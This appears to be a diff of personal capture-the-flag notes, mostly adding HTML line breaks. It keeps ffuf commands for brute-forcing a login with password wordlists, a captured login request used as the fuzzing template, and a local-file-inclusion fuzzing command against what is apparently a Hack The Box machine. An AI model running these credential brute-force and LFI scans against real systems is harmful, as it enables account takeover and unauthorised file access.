@@ -2,7 +2,6 @@
 
 
 #############################################
-
 #############################################
 
  2099  ffuf -c -request request.txt -request-proto http -mode clusterbomb -w users.txt:HFUZZ -w rockyou-50.txt:WFUZZ -v
@@ -63,25 +62,27 @@ ________________________________________________
 
 ffuf -c -request request.txt -request-proto http -mode clusterbomb -w DONE:HFUZZ -w /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt:WFUZZ -mc 200,301,302 -v
 
+<br>
 
-POST /login HTTP/1.1
-Host: interface
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-Accept: application/json, text/plain, */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/json
-Content-Length: 47
-Origin: http://as;dfklna;sdflkasdfe
-Connection: close
-Referer: http://a;sldfnaskdf;nalskdfnafd
-
+POST /login HTTP/1.1<br>
+Host: interface<br>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>
+Accept: application/json, text/plain, */*<br>
+Accept-Language: en-US,en;q=0.5<br>
+Accept-Encoding: gzip, deflate<br>
+Content-Type: application/json<br>
+Content-Length: 47<br>
+Origin: http://as;dfklna;sdflkasdfe<br>
+Connection: close<br>
+Referer: http://a;sldfnaskdf;nalskdfnafd<br>
+<br>
 {"username":"HFUZZ","password":"WFUZZ"}
-
+<br>
 
 
 #############################################
 #############################################
+<br>
 
 ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200 -c -fs 15349
 
